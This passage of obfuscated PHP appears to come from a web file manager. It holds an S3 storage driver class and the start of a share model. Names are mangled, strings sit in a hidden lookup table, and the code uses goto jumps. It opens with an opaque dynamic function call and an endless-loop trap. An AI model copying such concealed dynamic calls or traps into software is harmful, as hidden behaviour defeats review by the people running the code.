$_SERVER[ú‡®¯¨±][210]; $_act($_SERVER[$_SERVER[ú‡®¯¨±][205]] . $_SERVER[ú‡®¯¨±][206]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ú‡®¯¨±][211]); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($İÙÉ‡¡) { set_timeout(); require_once SDK_DIR . $_SERVER[ú‡®¯¨±][212]; parent::__construct(); $this->_init($İÙÉ‡¡); } public function _init($›êä”¿È) { $this->config = $›êä”¿È; foreach ($›êä”¿È as $¶î¾ûˆ => $Ùñ¼¨Š) { if (isset($this->{$¶î¾ûˆ})) { $this->{$¶î¾ûˆ} = $Ùñ¼¨Š; } } $this->endpoint = $›êä”¿È[$_SERVER[ú‡®¯¨±][213]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ƒÍ¼¸ó– = "\x76\x34") { $this->signVer = $ƒÍ¼¸ó–; $this->client->setSignatureVersion($ƒÍ¼¸ó–); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $›Š³ñ½¶ =& $_SERVER[ú‡®¯¨±]; $«¶×åßá = $this->getBucketCors(); if (!$«¶×åßá || !is_array($«¶×åßá)) { return !1; } if ($«¶×åßá[$›Š³ñ½¶[214]] != $›Š³ñ½¶[215] || $«¶×åßá[$›Š³ñ½¶[216]] != $›Š³ñ½¶[215]) { return !1; } $Õ˜ÈÓ‚÷ = array_map($›Š³ñ½¶[217], $«¶×åßá[$›Š³ñ½¶[218]]); if (!is_array($Õ˜ÈÓ‚÷)) { $Õ˜ÈÓ‚÷ = array(); } $üœ–ã«” = array($›Š³ñ½¶[219], $›Š³ñ½¶[220], $›Š³ñ½¶[221], $›Š³ñ½¶[222], $›Š³ñ½¶[223]); $±Äæ›À¼ = array_diff($üœ–ã«”, $Õ˜ÈÓ‚÷); return empty($±Äæ›À¼); } public function mkfile($ÌÏ¹Ÿ¿, $Šêíí¡« = '', $±Ë¿Û¨¬ = REPEAT_RENAME) { $ı¨—ß¨¹ = $this->setContent($ÌÏ¹Ÿ¿, $Šêíí¡«); if ($ı¨—ß¨¹ !== !1) { return $this->getPathOuter($ÌÏ¹Ÿ¿); } return !1; } public function mkdir($úØ€Õ, $Á•³ëÆŠ = REPEAT_SKIP) { $ñéÛÁùÌ =& $_SERVER[ú‡®¯¨±]; if (empty($úØ€Õ) && $úØ€Õ !== $ñéÛÁùÌ[224]) { return !1; } if ($Á•³ëÆŠ && $this->_isFolder($úØ€Õ)) { return $this->getPathOuter($úØ€Õ); } $åöª«ê¼ = $this->setContent($úØ€Õ, $ñéÛÁùÌ[12], !0); if ($åöª«ê¼ !== !1) { return $this->getPathOuter($úØ€Õ); } return !1; } public function copyFile($Ï£ÏæŸ, $—Şªˆ»ò, $ÌÚØÒ­ = array()) { $•²ı¤Œè =& $_SERVER[ú‡®¯¨±]; $Øé°”Úş = $this->objectMeta($Ï£ÏæŸ); if (!$Øé°”Úş) { return !1; } if ($Øé°”Úş[$•²ı¤Œè[78]] <= 1024 * 1024 * 200) { $ˆĞ•«æ¶ = $this->client->copyObject($this->bucket, $Ï£ÏæŸ, $this->bucket, $—Şªˆ»ò, $•²ı¤Œè[225], $ÌÚØÒ­); } else { $ˆĞ•«æ¶ = $this->client->multiCopyObject($this->bucket, $Ï£ÏæŸ, $this->bucket, $—Şªˆ»ò, $ÌÚØÒ­); } $ˆĞ•«æ¶ = $ˆĞ•«æ¶ ? $this->getPathOuter($—Şªˆ»ò) : !1; return $ˆĞ•«æ¶; } public function moveFile($×š¿çÄ, $øé£ü‘) { if ($this->copyFile($×š¿çÄ, $øé£ü‘)) { $this->delFile($×š¿çÄ); return $this->getPathOuter($øé£ü‘); } return !1; } public function delFile($àé¢ãÅø) { return $this->client->deleteObject($this->bucket, $àé¢ãÅø); } public function delFolder($éŞèÃõı) { $†Ì¾÷Ñ– =& $_SERVER[ú‡®¯¨±]; if (!$this->exist($éŞèÃõı)) { return !0; } $this->listItemCache = !1; $íêÏ´Ü¼ = $this->fileList($éŞèÃõı); $this->listItemCache = !0; $®´¦šˆ = trim($éŞèÃõı, $†Ì¾÷Ñ–[8]) . $†Ì¾÷Ñ–[8]; if (!empty($éŞèÃõı) && $éŞèÃõı !== $†Ì¾÷Ñ–[224] && !in_array($®´¦šˆ, $íêÏ´Ü¼[$†Ì¾÷Ñ–[84]])) { $íêÏ´Ü¼[$†Ì¾÷Ñ–[84]][] = $®´¦šˆ; } $›±¯¢öã = $this->delByBatch($íêÏ´Ü¼[$†Ì¾÷Ñ–[85]]); if (!$›±¯¢öã) { return !1; } $›±¯¢öã = $this->delByBatch($íêÏ´Ü¼[$†Ì¾÷Ñ–[84]]); if (!$›±¯¢öã) { return !1; } return $this->delFile($®´¦šˆ); } private function delByBatch($ÙÓ—é) { foreach (array_chunk($ÙÓ—é, 1000) as $Îş˜ù) { $’Çå¦•± = $this->client->deleteObjects($this->bucket, $Îş˜ù); if (!$’Çå¦•±) { return !1; } } return !0; } public function rename($Õ ÚèŞ‡, $ïšã‘¡) { return $this->renameObject($Õ ÚèŞ‡, $ïšã‘¡); } public function listPath($½º­ªü, $öİâ£·š = false) { $’Êáıø =& $_SERVER[ú‡®¯¨±]; $·•Î¡ŠÛ = $this->fileList($½º­ªü, $’Êáıø[8], !0); foreach ($·•Î¡ŠÛ[$’Êáıø[84]] as $æ²£­äè => $úÆÃ«) { $·•Î¡ŠÛ[$’Êáıø[84]][$æ²£­äè] = $this->folderInfo($úÆÃ«, $öİâ£·š, $úÆÃ«); } foreach ($·•Î¡ŠÛ[$’Êáıø[85]] as $æ²£­äè => $úÆÃ«) { $·•Î¡ŠÛ[$’Êáıø[85]][$æ²£­äè] = $this->fileInfo($úÆÃ«[$’Êáıø[32]], $öİâ£·š, $úÆÃ«); } return $·•Î¡ŠÛ; } protected function infoChildren($˜ãİÄÓ, &$¤µÃíğÎ) { $€çÁ¹Î =& $_SERVER[ú‡®¯¨±]; $æüÌŠ¹Ô = $this->fileList($˜ãİÄÓ, $€çÁ¹Î[12], !0); $¤µÃíğÎ[$€çÁ¹Î[80]] += count($æüÌŠ¹Ô[$€çÁ¹Î[84]]); $¤µÃíğÎ[$€çÁ¹Î[79]] += count($æüÌŠ¹Ô[$€çÁ¹Î[85]]); foreach ($æüÌŠ¹Ô[$€çÁ¹Î[85]] as $ôÄÒŸÛÊ) { if (!$ôÄÒŸÛÊ || !$ôÄÒŸÛÊ[$€çÁ¹Î[78]]) { continue; } $¤µÃíğÎ[$€çÁ¹Î[78]] += $ôÄÒŸÛÊ[$€çÁ¹Î[78]]; } } private function fileInfo($Š˜¼Áˆø, $ëÓ—ì¥ = false, $şœ»Å”ó = array()) { $¥Œå®í =& $_SERVER[ú‡®¯¨±]; $¨Ê‹´ñ = array($¥Œå®í[32] => $this->pathThis($Š˜¼Áˆø), $¥Œå®í[86] => $this->getPathOuter($Š˜¼Áˆø), $¥Œå®í[33] => $¥Œå®í[226], $¥Œå®í[177] => $this->ext($Š˜¼Áˆø), $¥Œå®í[78] => isset($şœ»Å”ó[$¥Œå®í[78]]) ? $şœ»Å”ó[$¥Œå®í[78]] : 0); if ($ëÓ—ì¥) { return $¨Ê‹´ñ; } $¨Ê‹´ñ[$¥Œå®í[227]] = $¨Ê‹´ñ[$¥Œå®í[87]] = 0; $¨Ê‹´ñ[$¥Œå®í[228]] = $¨Ê‹´ñ[$¥Œå®í[229]] = !0; if (empty($şœ»Å”ó)) { $şœ»Å”ó = $this->objectMeta($Š˜¼Áˆø); if (!$şœ»Å”ó) { return $¨Ê‹´ñ; } } if (isset($şœ»Å”ó[$¥Œå®í[230]]) && $şœ»Å”ó[$¥Œå®í[230]]) { $¨Ê‹´ñ[$¥Œå®í[231]] = $şœ»Å”ó[$¥Œå®í[230]]; } if (isset($şœ»Å”ó[$¥Œå®í[196]])) { $¨Ê‹´ñ[$¥Œå®í[87]] = $şœ»Å”ó[$¥Œå®í[196]]; } if (isset($şœ»Å”ó[$¥Œå®í[78]])) { $¨Ê‹´ñ[$¥Œå®í[78]] = $şœ»Å”ó[$¥Œå®í[78]]; } return $¨Ê‹´ñ; } private function folderInfo($’ÄÃ¸¹, $†ÇÙß…” = false, $–›½çì  = array()) { $×ã…ÍèË =& $_SERVER[ú‡®¯¨±]; $¿ø±¿Ã = array($×ã…ÍèË[32] => $this->pathThis($’ÄÃ¸¹), $×ã…ÍèË[86] => $this->getPathOuter($×ã…ÍèË[8] . $’ÄÃ¸¹), $×ã…ÍèË[33] => $×ã…ÍèË[77]); if ($†ÇÙß…”) { return $¿ø±¿Ã; } $¿ø±¿Ã[$×ã…ÍèË[227]] = $¿ø±¿Ã[$×ã…ÍèË[87]] = 0; $¿ø±¿Ã[$×ã…ÍèË[228]] = $¿ø±¿Ã[$×ã…ÍèË[229]] = !0; if ($’ÄÃ¸¹ == $×ã…ÍèË[12]) { return $¿ø±¿Ã; } if (empty($–›½çì )) { $–›½çì  = $this->objectMeta(trim($’ÄÃ¸¹, $×ã…ÍèË[8]) . $×ã…ÍèË[8]); } if (isset($–›½çì [$×ã…ÍèË[196]])) { $¿ø±¿Ã[$×ã…ÍèË[227]] = $–›½çì [$×ã…ÍèË[196]]; } return $¿ø±¿Ã; } private function fileList($ø‘üÖ, $§ãöªûÌ = '', $¾úÍÑ • = 0) { $ı’ÅÊ’â =& $_SERVER[ú‡®¯¨±]; $ÚÂíÃÅ› = rtrim($ø‘üÖ, $ı’ÅÊ’â[8]) . $ı’ÅÊ’â[8]; $Ù«‰¶Æ = $this->listObjs($ÚÂíÃÅ›, null, null, $§ãöªûÌ); if (!$Ù«‰¶Æ) { return array($ı’ÅÊ’â[84] => array(), $ı’ÅÊ’â[85] => array()); } $“ëØŠ¼£ = $”Ú§ƒÄ = array(); foreach ($Ù«‰¶Æ[$ı’ÅÊ’â[232]] as $‚ŸÅËÁ¾) { $¼¬ıŸÖµ = $‚ŸÅËÁ¾[$ı’ÅÊ’â[32]]; if ($¼¬ıŸÖµ == $ÚÂíÃÅ›) { continue; } $€¡ØÌÆ = isset($‚ŸÅËÁ¾[$ı’ÅÊ’â[78]]) ? $‚ŸÅËÁ¾[$ı’ÅÊ’â[78]] : 0; $¯Óœ¥¡Ú = $€¡ØÌÆ == 0 && substr($¼¬ıŸÖµ, strlen($¼¬ıŸÖµ) - 1, 1) == $ı’ÅÊ’â[8] ? !0 : !1; $this->cacheMethodInfoSet($¼¬ıŸÖµ, $¯Óœ¥¡Ú, $‚ŸÅËÁ¾); if ($¯Óœ¥¡Ú) { $“ëØŠ¼£[] = $¼¬ıŸÖµ; continue; } $”Ú§ƒÄ[] = $¾úÍÑ • ? $‚ŸÅËÁ¾ : $¼¬ıŸÖµ; } foreach ($Ù«‰¶Æ[$ı’ÅÊ’â[233]] as $‚ŸÅËÁ¾) { $“ëØŠ¼£[] = $‚ŸÅËÁ¾[$ı’ÅÊ’â[32]]; $this->cacheMethodInfoSet($‚ŸÅËÁ¾[$ı’ÅÊ’â[32]], !0); } $this->cacheMethodInfoSet($ø‘üÖ, !0); return array($ı’ÅÊ’â[84] => $“ëØŠ¼£, $ı’ÅÊ’â[85] => $”Ú§ƒÄ); } private function listObjs($ıˆ¦äûÄ, $íÈÓëç = null, $±õêø¯ = null, $Š¼æÜ†õ = null) { $ãÆåÜã =& $_SERVER[ú‡®¯¨±]; $ıˆ¦äûÄ = trim($ıˆ¦äûÄ, $ãÆåÜã[8]); $ñûçõìŞ = empty($ıˆ¦äûÄ) && $ıˆ¦äûÄ !== $ãÆåÜã[224] ? $ãÆåÜã[12] : $ıˆ¦äûÄ . $ãÆåÜã[8]; return $this->client->getBucket($this->bucket, $ñûçõìŞ, $íÈÓëç, $±õêø¯, $Š¼æÜ†õ, !0); } public function has($ÚŞÔæÃ, $¸ß„Òş¨ = false, $‡ïİ—€¾ = true) { $Ï®·¾şµ =& $_SERVER[ú‡®¯¨±]; $ÚŞÔæÃ = trim($ÚŞÔæÃ, $Ï®·¾şµ[8]); $Ü‘³¬ºÕ = empty($ÚŞÔæÃ) && $ÚŞÔæÃ !== $Ï®·¾şµ[224] ? $Ï®·¾şµ[12] : $ÚŞÔæÃ . $Ï®·¾şµ[8]; $‹õÍ¼±Á = null; $‡ÂàÄ¨ = 500; $öÁÅ˜€ó = $Ï®·¾şµ[8]; $ĞñÌ©´ô = $¨£±Œæ’ = array(); while (!0) { $œÉŞ„”ç = $this->listObjs($ÚŞÔæÃ, $‹õÍ¼±Á, $‡ÂàÄ¨, $öÁÅ˜€ó); if (!$œÉŞ„”ç) { break; } $‹õÍ¼±Á = $œÉŞ„”ç[$Ï®·¾şµ[234]]; $©•©í® = $œÉŞ„”ç[$Ï®·¾şµ[232]]; $„û¿§¬ = $œÉŞ„”ç[$Ï®·¾şµ[233]]; if (empty($©•©í®) && empty($„û¿§¬)) { break; } if (count($©•©í®) == 1 && $©•©í®[0][$Ï®·¾şµ[32]] == $Ü‘³¬ºÕ) { break; } if ($¸ß„Òş¨) { if (count($©•©í®)) { $©•©í® = array_column($©•©í®, $Ï®·¾şµ[32]); $ĞñÌ©´ô = array_merge($ĞñÌ©´ô, $©•©í®); } if (count($„û¿§¬)) { $„û¿§¬ = array_column($„û¿§¬, $Ï®·¾şµ[32]); $¨£±Œæ’ = array_merge($¨£±Œæ’, $„û¿§¬); } if ($‹õÍ¼±Á === null) { break; } continue; } if ($‡ïİ—€¾) { if (!empty($©•©í®)) { if (count($©•©í®) > 1 || isset($©•©í®[0][$Ï®·¾şµ[32]]) && $©•©í®[0][$Ï®·¾şµ[32]] != $Ü‘³¬ºÕ) { return !0; } } } else { if (!empty($„û¿§¬)) { return !0; } } if ($‹õÍ¼±Á === null) { break; } } if ($¸ß„Òş¨) { $ĞñÌ©´ô = array_diff($ĞñÌ©´ô, array($Ü‘³¬ºÕ)); $ĞñÌ©´ô = count(array_unique($ĞñÌ©´ô)); $¨£±Œæ’ = count(array_unique($¨£±Œæ’)); return array($Ï®·¾şµ[235] => $ĞñÌ©´ô, $Ï®·¾şµ[236] => $¨£±Œæ’); } return !1; } public function listAll($ÆºË¢©¦) { $èÜëï°œ =& $_SERVER[ú‡®¯¨±]; $·ÇèĞÈ¼ = $this->fileList($ÆºË¢©¦, $èÜëï°œ[12], !0); $»ˆ”‚Ô = array_to_keyvalue($·ÇèĞÈ¼[$èÜëï°œ[85]], $èÜëï°œ[32]); foreach ($·ÇèĞÈ¼[$èÜëï°œ[84]] as $­ôã‹¼î) { if (is_string($­ôã‹¼î)) { $»ˆ”‚Ô[$­ôã‹¼î] = array($èÜëï°œ[78] => 0); } } return $this->listAllFiles($ÆºË¢©¦, $»ˆ”‚Ô); } public function canRead($Ö¯ÖßÛƒ) { $ŸíßƒÜ =& $_SERVER[ú‡®¯¨±]; $×¿‚ß»ç = $this->client->getAccessControlPolicy($this->bucket, $Ö¯ÖßÛƒ); if (!$×¿‚ß»ç) { return !1; } return in_array($×¿‚ß»ç, array($ŸíßƒÜ[237], $ŸíßƒÜ[238], $ŸíßƒÜ[239])) ? !0 : !1; } public function canWrite($Ğ¢Ë¶ˆ®) { $ı©––šå =& $_SERVER[ú‡®¯¨±]; $îôò²êŒ = $this->client->getAccessControlPolicy($this->bucket, $Ğ¢Ë¶ˆ®); if (!$îôò²êŒ) { return !1; } return in_array($îôò²êŒ, array($ı©––šå[237], $ı©––šå[238])) ? !0 : !1; } public function getContent($Ç°şš¯–) { return $this->client->getObject($this->bucket, $Ç°şš¯–); } public function setContent($¹¦Ë”Çû, $­·õ€ÆÌ = '', $¨¤Ö÷õà = false) { $°ÄÕôö¼ =& $_SERVER[ú‡®¯¨±]; $¹¦Ë”Çû = $¨¤Ö÷õà ? trim($¹¦Ë”Çû, $°ÄÕôö¼[8]) . $°ÄÕôö¼[8] : $¹¦Ë”Çû; $¯õ³ä = get_file_mime(get_path_ext($¹¦Ë”Çû)); $‘ÇÈùè¢ = $this->client->putObject($­·õ€ÆÌ, $this->bucket, $¹¦Ë”Çû, $°ÄÕôö¼[225], array(), $¯õ³ä); if (!$‘ÇÈùè¢) { return !1; } if ($¨¤Ö÷õà) { return !0; } $this->cacheMethod(null, null); $‘ÇÈùè¢ = $this->copyFile($¹¦Ë”Çû, $¹¦Ë”Çû, array($°ÄÕôö¼[240] => $‘ÇÈùè¢[$°ÄÕôö¼[230]])); return $‘ÇÈùè¢ ? !0 : !1; } public function fileSubstr($ƒûÛß¾Ä, $ÜŸúæş, $×ã¦óú˜) { $şËØı›„ = $ÜŸúæş + $×ã¦óú˜ - 1; return $this->client->getObject($this->bucket, $ƒûÛß¾Ä, array($_SERVER[ú‡®¯¨±][241] => "\142\x79\164\x65\x73\x3d{$ÜŸúæş}\x2d{$şËØı›„}")); } public function upload($ÜéØ±®Õ, $Ê—¤Ûºú, $Åº›éÆÙ = false, $ÄùÃ£æ = REPEAT_REPLACE) { $ÈøşìÃ =& $_SERVER[ú‡®¯¨±]; $³˜œÙ¹ = array($ÈøşìÃ[240] => @md5_file($Ê—¤Ûºú)); $œ„áÉù = array($ÈøşìÃ[242] => get_file_mime(get_path_ext($ÜéØ±®Õ))); if (IO::size($Ê—¤Ûºú) <= 1024 * 1024 * 200) { $Ú’Ş›¦ = $this->client->putObjectFile($Ê—¤Ûºú, $this->bucket, $ÜéØ±®Õ, $ÈøşìÃ[225], $³˜œÙ¹, $œ„áÉù); return !empty($Ú’Ş›¦) ? $this->getPathOuter($ÜéØ±®Õ) : !1; } $—Ò®Ö½¡ = $this->client->multiUploadObject($Ê—¤Ûºú, $this->bucket, trim($ÜéØ±®Õ, $ÈøşìÃ[8]), $³˜œÙ¹, $œ„áÉù); return $—Ò®Ö½¡ ? $this->getPathOuter($ÜéØ±®Õ) : !1; } public function download($–ƒË¹ÕŸ, $‘ÊĞºø) { if (!@is_dir($this->pathFather($‘ÊĞºø)) && !IO::mkdir($this->pathFather($‘ÊĞºø))) { return !1; } $˜¼şÂãÃ = $this->client->getObject($this->bucket, $–ƒË¹ÕŸ, array(), $‘ÊĞºø); return $˜¼şÂãÃ !== !1 ? $‘ÊĞºø : !1; } public function link($¤î‹Œ¡, $Ç¥ÑÁ = array()) { $Ü¢¡˜é» =& $_SERVER[ú‡®¯¨±]; if ($this->signVer == $Ü¢¡˜é»[243]) { return $this->client->getAuthenticatedURL($this->bucket, $¤î‹Œ¡, 3600 * 12, $Ç¥ÑÁ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($¤î‹Œ¡, $Ü¢¡˜é»[8]), 3600 * 12, $this->region, array(), !0, $Ç¥ÑÁ); } public function fileOut($íô™«µæ, $¤ğ¶½ = false, $Ÿ›ƒÎ–Ä = false, $…°¦şïÆ = '') { $îîû“Ë =& $_SERVER[ú‡®¯¨±]; if ($this->isFileOutServer()) { return $this->fileOutServer($íô™«µæ, $¤ğ¶½, $Ÿ›ƒÎ–Ä, $…°¦şïÆ); } if (!$Ÿ›ƒÎ–Ä) { $Ÿ›ƒÎ–Ä = $this->pathThis($íô™«µæ); } $Ğî¦™È = get_file_mime(get_path_ext($Ÿ›ƒÎ–Ä)); if ($Ğî¦™È == $îîû“Ë[244]) { return parent::fileOut($íô™«µæ, $¤ğ¶½, $Ÿ›ƒÎ–Ä, $…°¦şïÆ); } $ÅÆœ‘© = array($îîû“Ë[245] => $Ğî¦™È); if ($¤ğ¶½) { $ÅÆœ‘©[$îîû“Ë[246]] = $îîû“Ë[247] . rawurlencode($Ÿ›ƒÎ–Ä); } else { } $¹ü±ü = $this->link($íô™«µæ, $ÅÆœ‘©); $this->fileOutLink($¹ü±ü); } public function fileOutServer($ü¬İñĞ, $“…¤¾¶» = false, $»íˆ¾†ä = false, $ŒÀ¡ªè• = '') { parent::fileOut($ü¬İñĞ, $“…¤¾¶», $»íˆ¾†ä, $ŒÀ¡ªè•); } public function fileOutImageServer($ëØÄğéÚ, $‚ãíãã = 250) { parent::fileOutImage($ëØÄğéÚ, $‚ãíãã); } public function hashMd5($öİºËı¹, $Õø¡öŒ‘ = '') { $üòŸ°ö =& $_SERVER[ú‡®¯¨±]; $Â»Š‚ŠÍ = $this->objectMeta($öİºËı¹); if (!$Â»Š‚ŠÍ) { return !1; } $Õø¡öŒ‘ = $Õø¡öŒ‘ ? $Õø¡öŒ‘ : _get($Â»Š‚ŠÍ, $üòŸ°ö[248]); $Õø¡öŒ‘ = $Õø¡öŒ‘ ? $Õø¡öŒ‘ : _get($Â»Š‚ŠÍ, $üòŸ°ö[230], $üòŸ°ö[12]); return $Õø¡öŒ‘; } public function uploadFormData($±ØØ…ªÜ, $ª®©ğÜª = 3600) { $›º§ÅÊ¼ =& $_SERVER[ú‡®¯¨±]; $ßïº†ïÖ = $this->pathFather($±ØØ…ªÜ); $ØŒ”¹£‡ = $this->client->getHttpUploadPostParams($this->bucket, $ßïº†ïÖ, $›º§ÅÊ¼[225], $ª®©ğÜª); return array_merge((array) $ØŒ”¹£‡, array($›º§ÅÊ¼[198] => $this->getHost())); } public function multiUploadFormData($á•üòÙÖ, $Û‹éò— = 3600) { $Í’ŠùÎÂ =& $_SERVER[ú‡®¯¨±]; $Ïø×å¦ = gmdate($Í’ŠùÎÂ[249]); $Á–ÓŒ– = array(); $šñ‰±¡¼ = $this->client->getUploadId($this->bucket, $á•üòÙÖ, $Á–ÓŒ–); if (!$šñ‰±¡¼) { return !1; } return array($Í’ŠùÎÂ[250] => $šñ‰±¡¼, $Í’ŠùÎÂ[198] => $this->getHost() . $Í’ŠùÎÂ[8] . $this->pathEncode($á•üòÙÖ), $Í’ŠùÎÂ[251] => $Ïø×å¦, $Í’ŠùÎÂ[96] => $á•üòÙÖ); } public function multiUploadAuthData($òİÇËµş, $­Ü·Ñœ = array()) { $€Ìñúœæ =& $_SERVER[ú‡®¯¨±]; $†ñĞ  = isset($­Ü·Ñœ[$€Ìñúœæ[251]]) ? $­Ü·Ñœ[$€Ìñúœæ[251]] : gmdate($€Ìñúœæ[249]); $·¼æ¥¬Ù = isset($­Ü·Ñœ[$€Ìñúœæ[177]]) ? $­Ü·Ñœ[$€Ìñúœæ[177]] : $€Ìñúœæ[12]; $‹ş¸Û” = $­Ü·Ñœ[$€Ìñúœæ[96]]; unset($­Ü·Ñœ[$€Ìñúœæ[96]]); if (isset($­Ü·Ñœ[$€Ìñúœæ[252]])) { $­Ü·Ñœ[$€Ìñúœæ[251]] = $†ñĞ ; return $this->listUploadParts($‹ş¸Û”, $­Ü·Ñœ); } $ƒ·µÎ³¸ = array($€Ìñúœæ[253], $€Ìñúœæ[12], $€Ìñúœæ[122], $€Ìñúœæ[12], "\170\55\141\155\x7a\55\x64\x61\164\145\72{$†ñĞ }", $€Ìñúœæ[8] . $this->bucket . $€Ìñúœæ[8] . $this->pathEncode($‹ş¸Û”) . $·¼æ¥¬Ù); if (strpos($·¼æ¥¬Ù, $€Ìñúœæ[254]) === 0) { $ƒ·µÎ³¸[0] = $€Ìñúœæ[255]; } if (isset($­Ü·Ñœ[$€Ìñúœæ[256]]) && $­Ü·Ñœ[$€Ìñúœæ[256]] == $€Ìñúœæ[257]) { $ƒ·µÎ³¸[0] = $€Ìñúœæ[257]; } $ÎµÀíĞ = implode($€Ìñúœæ[207], $ƒ·µÎ³¸); $‘Ó–É®€ = base64_encode(hash_hmac($€Ìñúœæ[258], $ÎµÀíĞ, $this->secret, !0)); $Ş½òş·™ = $€Ìñúœæ[259] . $this->accessKey . $€Ìñúœæ[4] . $‘Ó–É®€; if (strpos($·¼æ¥¬Ù, $€Ìñúœæ[254]) === 0) { return array($€Ìñúœæ[260] => $Ş½òş·™, $€Ìñúœæ[251] => $†ñĞ ); } return $Ş½òş·™; } public function listUploadParts($œê£ıâ, $ÁÛƒÄıŠ = array()) { $©º¼Ô =& $_SERVER[ú‡®¯¨±]; $–÷¦œ± = str_replace($©º¼Ô[261], $©º¼Ô[12], $ÁÛƒÄıŠ[$©º¼Ô[177]]); $ŒÒÊµøú = $this->client->listParts($this->bucket, $œê£ıâ, $–÷¦œ±); if (!$ŒÒÊµøú) { return !1; } unset($ÁÛƒÄıŠ[$©º¼Ô[252]], $ÁÛƒÄıŠ[$©º¼Ô[256]]); $ÁÛƒÄıŠ[$©º¼Ô[96]] = $œê£ıâ; $á‚ÍÈìî = $this->multiUploadAuthData($œê£ıâ, $ÁÛƒÄıŠ); if (empty($á‚ÍÈìî)) { return !1; } return array($©º¼Ô[260] => $á‚ÍÈìî, $©º¼Ô[251] => $ÁÛƒÄıŠ[$©º¼Ô[251]], $©º¼Ô[262] => $ŒÒÊµøú); } public function getHost() { return parent::getHost() . $_SERVER[ú‡®¯¨±][8] . $this->bucket; } public function size($ÕòØÒ«») { $äØÄÊ¿‡ = $this->objectMeta($ÕòØÒ«»); return $äØÄÊ¿‡ ? $äØÄÊ¿‡[$_SERVER[ú‡®¯¨±][78]] : 0; } public function info($†¥ğµÛ) { if ($this->isFolder($†¥ğµÛ)) { return $this->folderInfo($†¥ğµÛ); } else { if ($this->isFile($†¥ğµÛ)) { return $this->fileInfo($†¥ğµÛ); } } return !1; } public function exist($Ïç÷Ëî) { return $this->isFile($Ïç÷Ëî) || $this->isFolder($Ïç÷Ëî); } public function isFile($Œğê¦Óæ) { return !$this->isFolder($Œğê¦Óæ) && $this->objectMeta($Œğê¦Óæ); } public function isFolder($ù¢’¡‡è) { return $this->cacheMethod($_SERVER[ú‡®¯¨±][168], $ù¢’¡‡è); } protected function objectMeta($¦—¤½ş®) { return $this->cacheMethod($_SERVER[ú‡®¯¨±][170], $¦—¤½ş®); } protected function _objectMeta($ÉÉ‘º²‘) { $üÜ¬º®â =& $_SERVER[ú‡®¯¨±]; $ÉÉ‘º²‘ = rtrim($ÉÉ‘º²‘, $üÜ¬º®â[8]); try { $ºíà¶ÏŸ = $this->client->getObjectInfo($this->bucket, $ÉÉ‘º²‘); if (!isset($ºíà¶ÏŸ[$üÜ¬º®â[248]]) && isset($ºíà¶ÏŸ[$üÜ¬º®â[263]])) { $ºíà¶ÏŸ[$üÜ¬º®â[248]] = $ºíà¶ÏŸ[$üÜ¬º®â[263]]; } } catch (Exception $¼¡«Îôë) { $ºíà¶ÏŸ = !1; } if (!$ºíà¶ÏŸ) { } return $ºíà¶ÏŸ; } protected function _isFolder($¸º–´è¢) { $‹²ÄÛµù =& $_SERVER[ú‡®¯¨±]; $¸º–´è¢ = rtrim($¸º–´è¢, $‹²ÄÛµù[8]); if ($¸º–´è¢ == $‹²ÄÛµù[12] || $¸º–´è¢ == $‹²ÄÛµù[8]) { return !0; } $ò×õâÒÎ = $this->client->getBucket($this->bucket, $¸º–´è¢, null, 1); if (empty($ò×õâÒÎ[$‹²ÄÛµù[232]])) { return !1; } $¤“õÎœå = $ò×õâÒÎ[$‹²ÄÛµù[232]][0][$‹²ÄÛµù[32]]; return stripos($¤“õÎœå, $¸º–´è¢ . $‹²ÄÛµù[8]) === 0 ? !0 : !1; if (substr($¤“õÎœå, -1) == $‹²ÄÛµù[8]) { return !0; } if (get_path_this($¤“õÎœå) == get_path_this($¸º–´è¢)) { return !1; } return !0; } } goto d­Äéšù´ó; eà“ÚÛÂ²Œ: class ShareModel extends ModelBase { protected $tableName = "\163\150\141\x72\145"; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\x54\x69\x6d\x65", "\164\x69\155\145", "\151\156\x73\145\x72\164\54\165\160\x64\141\x74\x65", "\146\165\156\x63\x74\151\157\156"), array("\143\x72\x65\141\164\x65\x54\151\x6d\145", "\164\x69\x6d\145", "\x69\x6e\163\x65\162\164", "\146\165\156\x63\164\x69\x6f\156"), array("\x6f\160\164\x69\x6f\x6e\x73", '', "\151\156\x73\145\162\164\54\165\160\x64\141\164\145\x2c\163\x65\154\x65\x63\x74", "\152\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ıÚä»¦Ë) { $ÕÓŞ¡ =& $_SERVER[ú‡®¯¨±]; $¸«çŒµ = isset($ıÚä»¦Ë[0]) ? $ıÚä»¦Ë[0] : !1; return array($ÕÓŞ¡[2045] => array(USER_ID, $ÕÓŞ¡[2046]), $ÕÓŞ¡[1986] => array($¸«çŒµ, $ÕÓŞ¡[2047])); } protected function listSimple() { $ÀÃÄÛ€ = array($_SERVER[ú‡®¯¨±][1708] => USER_ID); $µæíŠ¸¾ = $this->field($this->fieldList)->where($ÀÃÄÛ€)->select(); return $µæíŠ¸¾ ? $µæíŠ¸¾ : array(); } protected function getInfo($”ïÜÙ£¯, $ŠÃÒİíØ = false) { $àşÒëÈ° =& $_SERVER[ú‡®¯¨±]; if ($ŠÃÒİíØ) { return $this->_getShareInfo(array($àşÒëÈ°[643] => $”ïÜÙ£¯)); } $Èƒ‡—ú‡ = $this->cacheFunctionGet($àşÒëÈ°[1988], $”ïÜÙ£¯); return $Èƒ‡—ú‡; } public function getInfoByHash($¦Û•Å½é) { return $this->_getShareInfo(array($_SERVER[ú‡®¯¨±][2048] => $¦Û•Å½é)); } public function getInfoByPath($ºšÀª—Ñ) { $ÚÏ­Ÿ¼„ =& $_SERVER[ú‡®¯¨±]; $‘¥µªØ = array($ÚÏ­Ÿ¼„[1708] => USER_ID, $ÚÏ­Ÿ¼„[183] => $ºšÀª—Ñ); return $this->_getShareInfo($‘¥µªØ); } public function 